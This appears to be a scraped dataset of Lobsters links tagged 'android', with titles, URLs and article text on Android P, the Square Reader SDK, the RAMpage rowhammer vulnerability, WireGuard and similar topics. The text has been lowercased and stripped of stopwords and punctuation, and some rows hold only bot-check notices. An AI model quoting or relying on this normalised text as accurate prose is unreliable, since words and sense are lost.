singlestep decoding hardware memory support postprocessing decode decoding animated image read connectivity location wifi rtt indoor positioning android let build indoor positioning feature apps platform support ieee wifi protocol also known wifi roundtriptime rtt android device hardware support location permission location enabled apps use rtt apis measure distance nearby wifi access point aps device nt need connect aps use rtt maintain privacy phone able determine distance aps knowing distance aps calculate device position accuracy meter accuracy support usecases like inbuilding navigation finegrained locationbased service disambiguated voice control eg turn light locationbased information eg special offer product data cost sensitivity jobscheduler jobscheduler android central service help manage scheduled task work across doze app standby background limit android jobscheduler handle networkrelated job better user coordinating network status signal provided separately carrier job declare estimated data size signal prefetching specify detailed network report network congested unmetered jobscheduler manages work according network status example network congested jobscheduler might defer large network request unmetered run prefetch job improve user experience prefetching headline open mobile api nfc payment secure transaction android add implementation globalplatform open mobile api android supported device apps use omapi api access secure element se enable smartcard payment secure service hardware abstraction layer hal provides underlying api enumerating variety secure element ese uicc others available performance apps art performance android brings performance efficiency improvement apps art runtime expanded art use execution profile optimize apps reduce inmemory footprint compiled app code art us profile information ondevice rewriting dex file reduction across range popular apps expect correlate closely reduction system dex memory usage faster startup time apps optimized kotlin kotlin firstclass language android nt tried yet made enduring commitment kotlin android continue expand support including optimizing performance kotlin code android see first result work improved several compiler optimization especially target loop extract better performance also continuing work partnership jetbrains optimize kotlin generated code get latest kotlin performance improvement keeping android studio kotlin plugin uptodate today also releasing update android api sdk rev contains nullability annotation frequently used apis provide detail upcoming post modern android part android modernizing foundation android apps run part deep sustained investment security performance stability announced last year google play require app update target android oreo targetsdkversion higher november line app target platform earlier android api level user installing see warning dialog first time app run checklist resource help support migrate looking forward seeing apps getting modern android get apps ready android android coming pixel user starting today device month ahead important test app compatibility soon possible install current app google play device emulator running android work flow make sure app run look great handle android behavior change properly also watch us nonsdk interface app android restricts access selected nonsdk interface reduce reliance see recent post detail made necessary update recommend publishing google play right away without changing app platform targeting let ensure great experience android user work enhancing app android apis targeting enhance app android feature apis ready dive android build new feature apis android get started download official api sdk latest tool emulator image android studio use latest version android studio update project compilesdkversion targetsdkversion api change targeting make sure app support applicable behavior change soon ready publish apk update google play common strategy use google play beta testing feature get early feedback small group user staged rollout production visit android site detail developer documentation also check video google io android playlist new android developer coming device near starting today overtheair update android begin rolling pixel phone device participated beta program sony mobile xiaomi hmd global oppo vivo oneplus essential well qualifying android one device receive update end fall also working number partner launch upgrade device android year always system image pixel device available manual flash download looking android source find android open source project repository android branch next reached official release bringing developer preview close soon closing developer preview issue tracker new issue feedback feel free file new issue android aosp issue tracker thanks many developer early adopter participated android developer preview public beta contribution critical making android platform great one developer consumer
158,Lobsters,android,Android,Introducing Square Reader SDK,https://medium.com/@gjinich/introducing-square-reader-sdk-939a9ec2d197,introducing square reader sdk,introducing square reader sdk integrated inperson payment solution android io developer using square hardware http developersquareupcomblog square developer point sale api square reader sdk work add sdk documentation developer dashboard authorize sdk connect square reader contactless chip reader accept form payment learn shake shack fuzz infinite peripheral clover food lab acuity scheduling quiqmeds square reader sdk,introducing square reader sdkan integrated inperson payment solution android io developer using square hardwareheads moved like continue keeping latest technical content square please visit u new home http developersquareupcomblogit two year since introduced square developer platform empowers developer build custom solution square seller since developer used point sale api build custom solution used thousand seller leveraging square hardwarewhile developer love relying square securely manage complexity payment heard open square point sale app via api always ideal example difficult manage two different application building selfcheckout kiosk solution hard manage authentication two separate apps size deployment scaleswe listened feedback today thrilled announce launch square reader sdk developer use square hardware accept inperson payment directly within application appswitch required line code quickly add emv pcicompliant inperson payment android io app square reader sdk allows engineer zero knowledge payment build secure compliant solution hardware talking apps let developer good square good adam mack lead system architect fuzz production developer shake shack kiosk worksreader sdk enables io android developer easily build inperson payment solution using square platform affordable easytoget hardware developer add sdk project morning purchase square reader lunch take first pci emvcompliant card payment afternoon sort magical instant spend time talking interesting stuff instead worry payment work jenny zhao director digital marketing clover food labsadd sdkit easy get started reader sdk simply visit documentation site learn head developer dashboard request access sdk repositoryauthorize sdkwhether deploying device easy authorize application take payment behalf square seller server call mobile authorization api sends resulting authorization code client us authorize sdksquareupcommobileauthorizationcode authorizationcode yourmobileauthorizationcode expiresat connect square readerreader sdk designed work square beautiful reliable affordable hardware including contactless chip reader provide user interface help seller pair card reader ensure uptodate firmware help troubleshoot connectivity issuesaccept form paymentreader sdk make easy accept major credit card nfc payment inperson checkout flow emvcompliant used million square seller buyer across globe also provide powerful checkout configuration parameter configure checkout flow suit needslearn moredozens developer participated beta program built powerful custom solution using reader sdk example shake shack fuzz built selfservice kiosk application streamline ordering process allowing employee engage customersinfinite peripheral built ezmetr nextgeneration digital taxi meter currently used taxi throughout washington dc take card paymentsclover food lab built custom point sale system update menu twelve location real time accommodate everchanging menuacuity scheduling added inperson payment small business scheduling solution customer keyin card number lower rate cardpresent paymentsquiqmeds built platform allows point care also function pharmacy patient get medication end doctor visitvisit square reader sdk documentation site get started wait see build
159,Lobsters,android,Android,"Full-Stack Haskell, from Prototype to Production",https://www.youtube.com/watch?v=riJuXDIUMA0,fullstack haskell prototype production,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature yow lambda jam ryan trinkle fullstack haskell prototype production yowlambdajam youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature yow lambda jam ryan trinkle fullstack haskell prototype production yowlambdajam youtube
160,Lobsters,android,Android,“P is for Power”—Android engineers talk battery life improvements in Android P,https://arstechnica.com/gadgets/2018/08/p-is-for-power-how-google-tests-tracks-and-improves-android-battery-life/,p power engineer talk battery life improvement android p,enlarge second fireside android chat right cpu core right job tim murray enlarge htc one review murray murray ar said started core affinity google device always thought cpu scheduling something individual device manufacturer think something like survive customization happens thirdparty stuff murray ar system never bother moving background task around core freeforall murray benjamin poiesz,enlarge interview battery life last version android p developer preview released quickly heading toward final build another major android version android version life major focus adaptive battery feature dole background access apps use new auto brightness scheme devised android team made change background work run cpu together battery life batter err better ever get bit detail work sat pair android engineer benjamin poiesz group product manager android framework tim murray senior staff software engineer android course second fireside android chat learned bit android p overall specific thing google go diagnosing tracking battery life across range o install base follows transcript interview lightly edited clarity also included topical background comment italic right cpu core right job first docket talk cpu core affinity multicore cpu place nowadays desktop would get cpu many core exactly mobile phone usually get core come varying size meant different workload typical eightcore arm design get chip biglittle architecture four big core fast power hungry four little core slower easier energy usage process run big little core greatly affect much power use quickly run assigning process certain cpu core called setting cpu affinity android p changing cpu core affinity work background process save decent amount battery power given throwaway line google io keynote think first time talked detail tim murray actually core affinity work biglittle platform since actually got working performance initially back march actually read article htc one whateveritwas first phone snapdragon enlarge htc one amadeo murray talking htc one review featuring snapdragon infamous heat problem murray read kind looking around performance stuff general android knew using snapdragon nexus year read article said like hey run really hot got think wonder could better started thinking working people kernel team framework team came way control affinity service specific process activitymanager android activity single screen app like say email inbox systemlevel service activitymanager say tin manages activity background service closing requested needed memory usage murray activity manager service track important user think activity manager service kind macroscheduler would say kernel scheduler make decision millisecond microsecond level activity manager service track kind macrointeractions like service running app currently foreground user actually perceive example running navigation listening music screen know even though screen interacting phone care navigation performance care music performance probably nt care much else point started enforcing affinity control using knowledge activity manager service started really simple background service cached apps could run little core foreground service could use big core app currently interacting use core tried kind blew u away doubledigit percentage increase performance per watt every test tried basically informing kernel scheduler kind constraining kernel scheduler important user enables make much better decision result much better power performance tradeoff long time even pixel still biglittle cpu much le biglittle cpu still benefit used everything p looked running screen big core big core draw significantly power little core found lot thing running related system kind system service running looked many performance critical turn screen least performance critical screen end bound normal foreground service something else chain informs activity manager process important p turn screen kind system service get moved restricted cpu stack rather able use little core big core restrict using little core save battery make battery predictable ever case system service going use amount power screen power draw reduced dramatically big core much bigger little core draw much power result ar said started core affinity google device always thought cpu scheduling something individual device manufacturer think something like survive customization happens thirdparty stuff murray yes actually see used thirdparty device part normal android build android image support cpu set right stuff happens oem nt anything except set cpu set particular processor big invasive thing pretty straightforward tweak inside manage scheduling user space ar system never bother moving background task around core freeforall murray would nt say freeforall laughing prior nt looked biglittle soc depth part nexus oems approach deal time focused kernel scheduler making decision purely kernel scheduler try get effect really make explicit make easier whatever kernel scheduler nt one hmt variation ea whatever make easier scheduler make right decision kind reduce complexity kernel scheduler information higher level system use instead benjamin poiesz expand like scheduler seeing like hey bunch work see lot work need happen nt understand important work important work thing activity manager teach lower subsystem hey user actively engaged something need happen please efficiently smarter decision happening hood one key thing takeaway screen probably much need happen right away could infer like well maybe nt much work generated cpu stay low sometimes different reason subsystem set alarm set job try processing nt really way articulate bunch stuff whenever give u better way much implicit opposed asking engineer please flag important gon na hard make much implicit
161,Lobsters,android,Android,Fuchsia: Google Is Quietly Working on a Successor to Android,https://www.bloomberg.com/news/articles/2018-07-19/google-team-is-said-to-plot-android-successor-draw-skepticism,fuchsia google quietly working successor android,detected unusual activity computer network,detected unusual activity computer network continue please click box let u know robot
162,Lobsters,android,Android,EU fines Google €4.3B for using Android to strengthen dominance of Google search engine,http://europa.eu/rapid/press-release_IP-18-4581_en.htm,eu fine google using android strengthen dominance google search engine,,
163,Lobsters,android,Android,Google may have to make major changes to Android in response to a forthcoming fine in Europe,https://www.washingtonpost.com/technology/2018/07/09/google-may-have-make-major-changes-android-response-forthcoming-fine-europe/,google may make major change android response forthcoming fine europe,said time europe last year slapped google expansive competition consumerprotection law first announced set visit brussels week,heart eu looming decision google policy pressure smartphone tablet manufacturer use google android operating system preinstall tech giant apps eu eye device maker htc samsung face anticompetitive choice set google search default search service offer google chrome browser lose access android popular app store lacking portal owner android smartphones tablet easily download game apps service google competitor offered thirdparty developersvestager argued arrangement ensure google continued dominance internet ecosystem result forthcoming ruling could prohibit google striking appinstallation deal device maker expert said alternatively eu could force company give consumer easier way switch service like search engine phone tabletsa spokesman vestager declined comment google also declined comment google spokeswoman pointed comment general counsel kent walker eu announced probe android unleashed new generation innovation interplatform competition said time measure open flexible differentiated mobile computing platform google consequence could prove vast packaging tool like search including android device offer company way capture data user show ad eliminating pathway profit insight could prompt google rethink entire ecosystem android license device maker free bid ensure widescale adoption warding competitor apple nobody forced take google apps want certain apps whole suite said jakob kucharczyk vice president competition eu regulatory policy computer communication industry association trade group represents google help google make sure fund open source first place saidthe potential fine highlight europe become world aggressive regulator american technology giant decade scrutiny europe last year slapped google billion fine allegedly ranking comparisonshopping service higher search result similar tool offered rivalsthe penalty probe stand stark contrast united state federal regulator concluded limited investigation google without requiring company make major change armed expansive competition consumerprotection law vestager peer eu also handed large fine punishment recently apple alleged tax evasion facebook breaking previous privacy promise apple face similar scrutiny apps preloads phone partly make device google pixel phone small share android market encountering situation european consumer poised enjoy better protection u consumer said luther lowe senior vice president public policy yelp one company lobbied strong antitrust regulation googlein eu formal list allegation first announced vestager took issue way google manages android example device manufacturer preinstall google apps barred legal agreement selling android smartphones tablet run modified version operating systemgoogle maintains ensure android opensource operating system consistent experience user even change device vestager contended prevents consumer purchasing innovative smart mobile device based alternative potentially superior version android operating system said eu decision may final word matter google would able appeal even though meantime would need alter business practice risk additional financial penalty day fails complycomplicating vestager timeline however president trump set visit brussels week announcement still expected much eu government departs summer break
164,Lobsters,android,Android,Every Android Device Since 2012 Impacted by RAMpage Vulnerability,https://www.bleepingcomputer.com/news/security/every-android-device-since-2012-impacted-by-rampage-vulnerability/,every android device since impacted rampage vulnerability,personal computer virtual machine android javascript code gpu card network packet rampage latest rowhammer attack variation research paper rampage may also impact apple device pc vms sideloaded rampage target android ion subsystem github every android device released past year affected website,almost android device released since vulnerable new vulnerability named rampage international team academic revealed today vulnerability tracked variation rowhammer attack rowhammer hardware bug modern memory card year back researcher discovered someone would send repeated writeread request row memory cell writeread operation would create electrical field would alter data stored nearby memory following year researcher discovered rowhammerlike attack affected personal computer virtual machine android device researcher also found could execute rowhammer attack via javascript code gpu card network packet rampage latest rowhammer attack variation first rowhammer attack android device named drammer could modify data android device root android smartphones today researcher expanded initial work according research paper published today team eight academic three university two private company revealed new rowhammerlike attack android device named rampage rampage break fundamental isolation user application operating system researcher said apps typically permitted read data apps malicious program craft rampage exploit get administrative control get hold secret stored device might include password stored password manager browser personal photo email instant message even businesscritical document research team said rampage may also impact apple device pc vms research rampage vulnerability still early stage team say attack take androidbased smartphones tablet researcher team also belief rampage may also affect apple device home computer even cloud server researcher say updated previous app used past detected drammer also identify device vulnerable rampage app available play store must downloaded later sideloaded rampage target android ion subsystem difference previous drammer rowhammer attack android device newer rampage rowhammer attack rampage specifically target android memory subsystem called ion simplified explanation ion part android o manages memory allocation apps o google introduced ion android ice cream sandwich released october attacking ion rowhammer attack rampage allows intruder breake boundary exist android apps underlying o hence give attacker full control device data researcher released tool called guardion say layman term put guard front ion subsystem protect rampage attack routine tool opensourced github every android device released past year affected researcher reproduced rampage attack smartphone said every mobile device shipped memory potentially affected effectively every mobile phone since research team also published website detailing finding although website visual copy website used meltdown spectre vulnerability researcher said resemblance meltdownspectre rampage meltdown spectre go data stored inside cpu cache rampage go data stored inside ram card hope page get people involved contributing research research team wrote site currently unclear widespread rowhammer bug hardware error rampage exploit getting people run updated drammer test app hope get better understanding issue allowing u make decision move forward ie continue looking defense alreadysolved problem
168,Lobsters,android,Android,CopperheadOS Has Imploded,https://twitter.com/DanielMicay/status/1006299769214562305,copperheados imploded,,detected javascript disabled browser would like proceed legacy twitter yes
169,Lobsters,android,Android,Insider Attack Resistance,https://android-developers.googleblog.com/2018/05/insider-attack-resistance.html,insider attack resistance,external researcher protect encryption key secure hardware google pixel device,posted shawn willden staff software engineer smart device mobile phone tablet contain wealth personal information need kept safe google constantly trying find new better way protect valuable information android device partnering external researcher find fix vulnerability adding new feature android platform work make release new device safer last post talk google strategy making encryption google pixel device resistant various level platform hardware way people create signing key pixel device encrypt user data google pixel device protect encryption key secure hardware secure hardware run highly secure firmware responsible checking user password password entered incorrectly firmware refuse decrypt device firmware also limit rate password checked making harder attacker use brute force attack prevent attacker replacing firmware malicious version apply digital signature two way attacker defeat signature check install malicious replacement firmware find exploit vulnerability signaturechecking process gain access signing key get malicious version signed device accept legitimate update signaturechecking software tiny isolated vetted extreme thoroughness defeating hard signing key however must exist somewhere must people access past device maker focused safeguarding key storing key secure location severely restricting number people access good leaf people open attack coercion social engineering risky employee personally believe creates much risk user data mitigate risk google pixel device implement insider attack resistance tamperresistant hardware security module guard encryption key user data help prevent attacker manages produce properly signed malicious firmware installing security module lost stolen device without user cooperation specifically possible upgrade firmware check user password unless present correct user password way force upgrade example returned device refurbished resale forcing wipe secret used decrypt user data effectively destroying android security team belief insider attack resistance important element complete strategy protecting user data google pixel demonstrated possible protect user even highlyprivileged insider recommend mobile device maker help device maker working implement insider attack resistance reach android security team google contact acknowledgement post developed joint collaboration paul crowley senior software engineer
171,Lobsters,android,Android,Androzoo APK Search: a search service of meta-data related to Android malware,https://androzoo.uni.lu/apksearch,androzoo apk search search service metadata related android malware,androzoo apk search overview access condition architecture elasticsearch rest api authentication database schema use case count number document database use case retrieve application associated malware family adwo use case get document based application use case get multiple document based application use case retrieve list apps chinese translation file ending sh use case compute total size set android application use case retrieve list application package use case use elastic scroll api retrieve large set result use case find android application read phone state permission,androzoo apk search overview apk search online search service developed query androzoo application based service security expert retrieve information android apps including embedded file name signature meta information market size package antivirus label malware family type manifest information permission activity developer certificate issuer owner signature source code object eg class method string apk search available access condition androzoo architecture apk search us elasticsearch main storage backend frontend interface expose rest api user request client programming language authentication order send request apk search authenticate service email androzoo api key must encoded sent search request use snippet generate key forget colon echo n email access key echo n example unilu must replace tag apikey following query output command database schema complete mapping main index downloaded query curl x get h authorization basic apikey http androzoouniluapksearchapkindexmapping pretty use case count number document database curl x get h authorization basic apikey http androzoouniluapksearchapkindexcount use case retrieve application associated malware family adwo content queryjson size source false query match labelfamily adwo curl x get h contenttype applicationjson h authorization basic apikey http androzoouniluapksearchapkindexsearch pretty queryjson use case get document based application curl x get h authorization basic apikey http pretty use case get multiple document based application content queryjson doc type doc id type doc id curl x get h contenttype applicationjson h authorization basic apikey http androzoouniluapksearchapkindexmget pretty queryjson use case retrieve list apps chinese translation file ending sh content queryjson query bool must wildcard filename sh term resourcelanguage cn curl x post h contenttype applicationjson h authorization basic apikey http androzoouniluapksearchapkindexsearch queryjson use case compute total size set android application content queryjson size aggs total sum field metaapksize curl x post h contenttype applicationjson h authorization basic apikey http androzoouniluapksearchapkindexsearch queryjson use case retrieve list application package content queryjson size aggs package term field metapkgname curl x post h contenttype applicationjson h authorization basic apikey http androzoouniluapksearchapkindexmget pretty queryjson use case use elastic scroll api retrieve large set result content queryjson query match labelfamily adwo curl x get h contenttype applicationjson h authorization basic apikey http androzoouniluapksearchapkindexsearch pretty queryjson use case find android application read phone state permission content queryjson size source false query match manifestpermission androidpermissionreadphonestate curl x get h contenttype applicationjson h authorization basic apikey http androzoouniluapksearchapkindexsearch pretty queryjson
172,Lobsters,android,Android,"This Week in F-Droid, Week 21",https://f-droid.org/en/2018/05/25/this-week-in-fdroid-w21.html,week fdroid week,fdroid repository free open source client fdroid core new apps updated apps mupdf viewer fix several security hole update asap netguard gdpr important osmand yalp store broken easer archived removed apps next twif twif submission thread fdroid fdroidorg mastodontechnology freenode freenode fdroid matrixorg telegram forum toot mastodon tweet u,fdroid repository verified free open source android apps client access well whole store providing tool needed set run app store communityrun free software project developed wide range contributor story past week fdroid core news wider community week new apps updated apps total apps updated week highlight mupdf viewer fix several security hole update asap netguard back developer removed ad nonfree dependency hasslefree way comply gdpr way go info version already main repository used github release benefit host blocking feature export setting uninstall version reinstall fdroid import back setting reload host file important switch lose pro feature may bought osmand beta repository although installed default like give try expand version tab install manually negative report far remember still beta yalp store broken google repository fix easer tool automate many thing like switching wifi leaving home setting volume headset connected update brings ui change screen unlock event bunch crash fix archived removed apps apps removed next twif end next twif way many app update keep track need help highlight interesting change course love hear thing involving fdroid way please tell u twif submission thread forum tag update fdroid mastodon cc fdroidorg mastodontechnology make sure reach instance deadline next twif thursday utc feedback come talk u fdroid freenode matrix via freenode fdroid matrixorg telegram space bridged together also join u forum toot mastodon absolutely must tweet u
173,Lobsters,android,Android,Setup Android When Its Not Your Phone,https://vermaden.wordpress.com/2018/05/21/setup-android-when-its-not-your-phone/,setup android phone,initial setup next main screen setting connection setting apps desktop duckduckgo keyboard drop console bar battery model version single finger writer like,read many guide perfect phone sysadmin programmer often assumed would get exact phone model recommended latest one recommended old phone known work reliably root put custom rom let miui copperhead o security guide actually valuable fail applied phone lend put custom rom root even pick model get left stock option android setting wallpaper lock screen setting maybe add removedisable apps policy allows today share experience setup android phone phone string attached required keep ready use work purpose initial setup setup phone requires accept dozen eula agreement start using phone alert agree one required make next button work metadata sharing reliability usage pattern sharing making product better always remember something free product data metadata noise generate bill connect wireless wifi network allow connection wwan network mobile data enable later proper permission would set application get impression select everything inversely setup process something selected deselect valuable option many useless thing selected main screen see main screen first time definitely useless power draining widget enabled useless iconsapps placed example disable huge widget first desktop first go setting connection disable connectivity wifi mobile data bluetooth nfc kfc wtf everything go setting apps removedisable everything would use everything allowed use company policy like facebook google drive etc use office onenote gmail also disabled also revoked permission apps finish removal revoke permission apps need like google play service also disabled permission notification apps disturb future apps desktop left apps place gathered useless one directory apps still phone fit one screen switch screen desktop need black wallpaper desktop lock screen save battery time get one type back black duckduckgo image pick one entirely black may also prepare one course next remove unneeded iconsapps desktop put useful one also remove unused desktop widget wanted change icon theme something dark toned instead default circus would require accept another enormous samsung eula passed default circus one lock screen also clean black keyboard setup keyboard added native language spell check also configured special char appear hit dot button slot pick wisely remember swipe option keyboard enabled bit sometimes use typing left enabled state drop console bar also configured dropdown bar useful icon rom slot dropdown bar everything needed fit nicely battery configuration phone runtime long example battery capacity medium level battery saver enabled still allow use hour bad setting enabled blue light filter phone screen would mess le circadian rhythm also configured wireless hotspot next time laptop need ready configured play store need additional google connection app needed apk available apk added latest firefox browser course need allow least one time installation unknown source also picked le annoying sound incoming call notification also disabled sound vibration called touch feedback phone emit annoying sound every touch save battery instead playing vibrating entire configuration process took hour model version deliberately specified phone model used purpose article matter read article probably get model android version detailed android setup guide android version came phone general setup guide one need work foreign owner phone single finger writer may worth mentioning wrote entire article using phone wanted check annoyance occur something desktoplaptop oriented forced phone must admit experience terrible course choose freebsd laptop anytime phone typed article phone thought phone came naturally would use laptop many small quirk would lost also writing article phone took battery including taking screenshots eof like like loading related
174,Lobsters,android,Android,Liberating Amusing Use Cases with the F60 Action Camera Introduction,http://code.paulk.fr/article26/liberating-amusing-use-cases-with-the-f60-action-camera-introduction-motivations-for-going-down-the-road,liberating amusing use case action camera introduction,liberating amusing use case action camera introduction motivation going road comment allwinner replicant work replicant blog bootlin formerly free electron linuxsunxi community ongoing personal interest platform widelyavailable tablet lineageos linux coreboot uboot mobile use case aim cover plea upstream software tag along stay linaro currently working direction openmoko community neo freerunner phone shr nexus openfirmware devicetree ti samsung google arm freescalenxp rockchip linaro linuxsunxi bootlin formerly free electron collabora pengutronix signature verification gone wrong enforced boot software signature verification user device access associated key tivoization current status free upstream support always available android seems vastly encourage often case support vivante gpus revival lima project panfrost project medium request api reference driver available chromium o kernel tree early driver developer ayaka grate project vpu support sunxicedrus vpu driver freedesktoporg available without proprietary software wayland camera sensor input controller proper power management covering new interesting use case action camera soc allwinner minimal amount work support technical review allwinner action camera replicant android upstream mainline linux uboot coreboot drm,liberating amusing use case action camera introduction motivation going road written paul kocialkowski may comment series blog post set cover journey adding upstream uboot linux support action camera covering another exciting new use case freedom digital technology allwinner replicant work previously mentioned replicant blog started final engineering internship bootlin formerly free electron toulouse france internship focused bringing upstream support vpu used allwinner platform continuation longstanding reverse engineering effort carried linuxsunxi community xfce running tabletthis effort also continuation ongoing personal interest platform especially mobile form factor widelyavailable tablet although longer involved contributing technical side replicant still care project would like see move forward finding new developer replicant hard fair say large part project kept alive community user contributor project inherits upstream currently lineageos count developer far significant number adaptation introduced workaround use proprietary blob hardware support every new version device want support free software community effort related liberating hardware support sustainable futureproof direction happens sometimes inadvertently upstream project linux coreboot uboot project usually drag enough contribution keep maintainer busy since feature added code review process requires submitting clean maintainable code first place set feature supported mainline slow pickup downstream modified version provided manufacturer used instead replicant mobile use case aim cover constraint high term required feature power management seem like good idea ship mainline linux replicant first however using downstream software component cost term maintenance kernel update security kernel update longterm sustainability compatibility newer technology still kernel update amount required time spent dealing code minimum amount structure conventionality place also significant uboot jan working replicant became reluctant dedicate time new contribution mainly fact deal downstream code unpleasant also felt like time effort putin could ever short term impact level contributed software support useful long android linux version stayed relevant well ca nt say stay relevant long time use case dragged towards mainline software plea upstream software effort liberate hardware support much significant mainline contribution tag along stay long people care decision regarding code future version also taken community instead single entity although community may also take decision detrimental freedom digital technology mainline support landed linux userspace interface system standardized much le work putin userspace side precisely done incrementally updated new feature mean le involvement required replicant side ultimate goal making replicant sheer rebranding lineage o without proprietary blob using generic hardware abstraction layer hals shared across android system project already hals various aspect userspace software support developed company like intel stick close mainline still work left adapt hals mobile us case since could benefit android system would interesting bring coordinated effort supporting mainline kernel interface generic android hals something entity like linaro could care would allow redirecting development effort hardware support away downstream userspace side android system focused mainline instead course mainline support also benefit gnulinux system open possibility properly supporting mobile use case system also enabling new use casespurism currently working direction project integrate kde gnomebased interface mobile telephonyenabled device running gnulinux mobile device exactly new though first wave interest rose around openmoko community revolving around neo freerunner phone running gnulinux one system supporting phone shr stable hybrid release based freesmartphoneorg fso framework mobile device went support device nexus like original system freerunner using regular gnulinux application shr hard required using stylus interface obviously designed adapted mobile use case like plenty system component kernel side amount change required freerunner made upstreaming process slow still fully completed day development device neo freerunner nowadays mobile device revolve around arm instruction set commonly found arm cortex core implementation company arm support mainline linux kernel come long way since notably introduction openfirmware devicetree initially designed supporting powerpc device allowed clean distinction hardware description driver previously glued together plenty platform data initialization laid directly source code back adding support new device tedious kernel compiled precise device devicetree changed game became much easier introduce new devicespecific support possible run kernel binary different device arm instruction set also made platform bringup streamlined task easily reusing similar block previous generation applying appropriate quirk runtime number supported arm platform feature use case kept increasing commitment big company like ti samsung google arm freescalenxp rockchip entity like linaro linuxsunxi community also smaller player often providing upstreaming service company like bootlin formerly free electron collabora pengutronix supported platform ready conventional mobile use case yet come close already offer support reduced number use case signature verification gone wrong despite free software support linux platform fatally flawed come boot software running case enforced boot software signature verification missing key circuitry platform validates digital signature first software running boot public key stored readonly memory signature created using missing private key associated public key platform simply refuse boot significant number arm platform one made qualcomm snapdragon others amlogic samsung exynos plagued enforced boot software signature verification missing key signature verification really good thing make sense user device access associated key key kept secret manufacturer device platform whole security model device delegated third party user decide security model consider potential threat based situation may set third party fully trusted peer instead implemented security model cover third party threat model designed consider user threat might sound odd result enforcing technical limitation drm designed forbid user accessing unlocked raw multimedia content lg security errorthis modus operandi look similar parent would prevent newborn child wandering around night time applying technical restriction bar infant bed perfectly fine individual subjected restriction able decide good come individual capacity imposing intentional restriction designed serve third party interest first foremost feel inappropriate end limitation remove practical possibility user replace software signed missing key making proprietary software defacto sometimes occurs free copylefted software used device enforce signature verification first occurred tivo coined name tivoization process even source code appropriate compiler available intermediate form software obtained product form software form adapted practical use intrinsically tied processing unit executes associated software instruction practical ability install generated intermediate form code storage code executed effectively making product form software absolute requirement signature verification enforced part installation process related signing binary executed missing software thus never reach product form leaving user freedom source intermediate form software product form result software considered free whole although license say current status free upstream support thankfully number arm platform flawed manner allow running free boot software example platform include allwinner rockchip imx omap gp tegra without key burned uboot widely used device platform manufacturer often use modified downstream version based ancient upstream release associated source code uboot linux always available although project covered copyleft license often take form board support package tarball version control information part code required hardware support also come missing voluntarily moved copylefted project something android seems vastly encourage often case dram initialization feature related multimedia nevertheless source release useful often allow adding mainline support device google rockchip found samsung chromebook plus point time platform mentioned many device use supported le advanced degree upstream free software many significant task still ahead u work progress going good rate support vivante gpus found imx platform merged improved time also work progress mali utgard revival lima project mali midgardbifrost panfrost project concern number platform allwinner rockchip multimedia feature linux also work progress introduction medium request api allow supporting stateless vpus nt dedicated processor require firmware framework coupled framework already allows supporting stateful vpus one found exynos platform require proprietary loaded firmware support stateless vpus working progress rockchip side reference driver available chromium o kernel tree using early proposal medium request api well early driver developer ayaka addition reference rockchip kernel driver tegra side thing developer digetix grate project working vpu support early generation tegra apply newer generation limited effort allwinner vpu support work progress number version sunxicedrus vpu driver submitted already innards cuboxiin addition vpus support number image processing unit made available especially rockchip feature ranging colorspace conversion scaling operation like bit blit porterduff alpha blending processing useful generalpurpose image processing like colorspace conversion scaling seems relevant subsystem operation seem relevant drm subsystem seems much support operation acceleration generic drm interface regular userspace implementation freedesktoporg support acceleration compositor would allow significantly speeding operation without resorting gpu since gpus graphic card often required video feature system become common assumption gpu support available type graphical operation needle say gpu support arm still work progress currently generally available without proprietary software especially many platform embed mali powervr gpus moreover using gpu powerefficient compared dedicated hardware component sometimes even perform fast however drm subsystem already leverage plane overlay framebuffer position crtc blended hardware hitting encoder single frame plane support xorg currently easy thing implement especially come showing yuv video frame dedicated plane historical approach supporting use case consists setting color key display hardware set particular color alpha blend result video frame integrates rest display content one downside coloured box bounding video plane follow movement window displaying coordination required coordination well colorkeying historically provided xv extension x server ala extension relies buffer copy introducing significant bottleneck performance sharing buffer directly much preferred approach nowadays wade possible dmabuf handle thankfully wayland bring solution issue found xorg feature related multimedia slowly picking support linux support medium pipeline camera sensor input controller specific feature also require significant effort proper power management crucial feature mobile device development happening idea running mobile device upstream free software significant set feature allowing usual daily use case slowly becomes reality day embedded mobile device seem get diversified laptop phone tablet nowadays found sort form factor convertible laptop singleboard computer mini pc dongle home automation equipment even connected surveillance car action camera new use case running wild downstream software cause great deal issue term freedom privacysecurity proposed solution allowing somewhat sane use technology clearly start upstream software support product use case necessarily good thing societywide scale provided exist might well try sanitize technology support new use case covering new interesting use case going latest released device chinese marketplace like aliexpress gearbest noticed number action camera featuring wifi hdmi everrenewed interest finding gut unusual device well come think usual device ran spec found soc allwinner one probably vpu writing support one also pixel sensor wideangle lense attached screaming piped vpu encoder unfortunately one yet supported upstream uboot linux thankfully community quick pickup support soc allwinner contributed mainline uboot linux linuxsunxi community member icenowy also designed board using integrated lqfp package grouping mib dram processor controller allwinner soc allwinner soc past allwinner already released chip minor variation different name matching matching chip share nearly exact set register platform based came adding support uboot linux minimal amount work required support good shape free upstream hardware support project adding bringing based existing support device hand look like rather reasonable task clicked typed clicked typed received little package name action camera inside next process discovering documenting component used camera starting hardware teardown classified technical review tag allwinner action camera replicant android upstream mainline linux uboot coreboot drm
175,Lobsters,android,Android,Alpha Snapshots of WireGuard for Android and macOS,https://lists.zx2c4.com/pipermail/wireguard/2018-May/002854.html,alpha snapshot wireguard android macos,announce alpha snapshot wireguard android macos jason http playgooglecomstoreappsdetails idcomwireguardandroid team wireguardcom http wwwwireguardcominstall information wireguard mailing list,announce alpha snapshot wireguard android macos jason donenfeld jason wed may cest hey folk gradually adding platform capable running wireguard thanks stillbuggy userspace code mathias developing today try wireguard two new platform android macos new wireguard android download app play store fdroid support adding wgquick style conf file zip app us kernel module available give best performance stability battery life fall back userspace code available download http playgooglecomstoreappsdetails idcomwireguardandroid new wireguard macos install wgquick wg wireguardgo using homebrew able run wgquick whatever familiar command used setting network manually run wireguardgo place usual linux command ip link add dev wireguard install homebrew command brew install wireguardtools future wireguard yourfavoriteplatform work progress hope nice thing announce coming week interested helping develop support particular platform please send u email team wireguardcom workhorse wireguard linux linux kernel implementation remains recommended complete wireguard implementation actively working upstreaming code kernelorg install instruction available every major distro http wwwwireguardcominstall disclaimer alpha warning securityrelated software new implementation macos android alpha quality best keep expectation low bug may even security issue nt yet certify software want let u know encounter inevitable nasty bug consider prerelease software enjoy jason information wireguard mailing list
